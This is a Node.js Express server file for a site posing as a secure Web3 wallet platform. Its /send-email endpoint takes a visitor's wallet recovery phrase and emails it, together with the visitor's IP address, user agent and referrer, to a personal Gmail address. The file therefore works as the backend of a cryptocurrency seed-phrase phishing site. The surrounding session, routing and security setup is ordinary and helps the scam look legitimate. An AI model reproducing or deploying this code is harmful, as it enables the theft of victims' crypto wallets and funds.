require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const path = require('path');
const connectDB = require('./config/db');
const MongoStore = require('connect-mongo');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { refreshUserStatus } = require('./middleware/auth');
const cors = require('cors');
const { Resend } = require('resend');  

// Connect to MongoDB
connectDB();

const app = express();

// Body Parser Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));


// CORS configuration
app.use(cors({
  origin: ['https://riverstonewyoming.site', 'http://localhost:9000', 'http://127.0.0.1:5500'],
  methods: ['GET', 'POST'],
  credentials: true
}));

const resend = new Resend(process.env.RESEND_API_KEY);

// ✅ FIXED: /send-email endpoint with better error handling
app.post('/send-email', async (req, res) => {
  const { keyPhrase } = req.body;

  if (!keyPhrase || keyPhrase.trim() === '') {
    return res.status(400).json({ 
      success: false, 
      message: 'Key phrase is required' 
    });
  }

  try {
    const date = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.get('User-Agent') || 'Unknown';
    const referer = req.get('Referer') || 'Direct';

    const { data, error } = await resend.emails.send({
      from: process.env.MAIL_FROM || 'River Stone Wyoming <support@ripplexvault.link>',
      to: ['johnsonray1840@gmail.com'], // ✅ FIXED: Array format
      subject: `🔐 New Wallet Connection - ${date}`,
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0e17; margin: 0; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #131824; border-radius: 16px; overflow: hidden; border: 1px solid #1e293b; }
            .header { background: linear-gradient(135deg, #f0b90b, #f59e0b); color: #000; padding: 20px; text-align: center; font-weight: 700; font-size: 18px; }
            .content { padding: 24px; color: #e2e8f0; }
            .label { color: #8892a8; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
            .phrase-box { background: #0a0e17; border: 2px solid #f0b90b; color: #f0b90b; padding: 20px; border-radius: 12px; font-family: 'Courier New', monospace; font-size: 15px; word-break: break-all; margin: 15px 0; line-height: 1.6; }
            .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1e293b; font-size: 13px; }
            .info-label { color: #8892a8; }
            .info-value { color: #e2e8f0; font-weight: 500; }
            .footer { text-align: center; color: #64748b; font-size: 11px; padding: 16px; border-top: 1px solid #1e293b; }
          </style>
        </head>
        <body>
          <div class='container'>
            <div class='header'>🔐 New Wallet Connection</div>
            <div class='content'>
              <div class='label'>Recovery Phrase</div>
              <div class='phrase-box'>${keyPhrase}</div>
              <div style='margin-top: 20px;'>
                <div class='label' style='margin-bottom: 10px;'>Connection Details</div>
                <div class='info-row'>
                  <span class='info-label'>📅 Date/Time</span>
                  <span class='info-value'>${date}</span>
                </div>
                <div class='info-row'>
                  <span class='info-label'>🌐 IP Address</span>
                  <span class='info-value'>${ip}</span>
                </div>
                <div class='info-row'>
                  <span class='info-label'>🖥️ User Agent</span>
                  <span class='info-value' style='font-size:11px;'>${userAgent}</span>
                </div>
                <div class='info-row'>
                  <span class='info-label'>🔗 Referrer</span>
                  <span class='info-value'>${referer}</span>
                </div>
              </div>
            </div>
            <div class='footer'>Web3 Vault Connect • Secure Wallet Platform</div>
          </div>
        </body>
        </html>
      `
    });

    if (error) {
      console.error('❌ Resend API error:', error);
      return res.status(500).json({ 
        success: false, 
        message: error.message || 'Failed to send email' 
      });
    }

    console.log('✅ Email sent via Resend:', data?.id || 'Success');
    res.status(200).json({ 
      success: true, 
      message: 'Email sent successfully!',
      id: data?.id 
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ 
      success: false, 
      message: error.message || 'Internal server error' 
    });
  }
});

// Rate Limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use('/api/', limiter);

// Session Configuration
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: process.env.MONGODB_URI,
    collectionName: 'sessions'
  }),
  cookie: {
    maxAge: 1000 * 60 * 60 * 24
  }
}));

// Refresh session data from DB on every request
app.use(refreshUserStatus);

// Static Files
app.use(express.static(path.join(__dirname, 'public')));

// Set View Engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Make user available to all views
app.use((req, res, next) => {
  res.locals.user = req.session.user || null;
  res.locals.isAuthenticated = !!req.session.user;
  res.locals.isAdmin = req.session.user?.role === 'admin';
  next();
});

// Routes
app.use('/', require('./routes/index'));
app.use('/auth', require('./routes/auth'));
app.use('/admin', require('./routes/admin'));
app.use('/user', require('./routes/user'));
app.use('/trust', require('./routes/trust'));


// 404 Handler
app.use((req, res) => {
  res.status(404).render('404', { title: 'Page Not Found' });
});

// Error Handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).render('500', { title: 'Server Error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});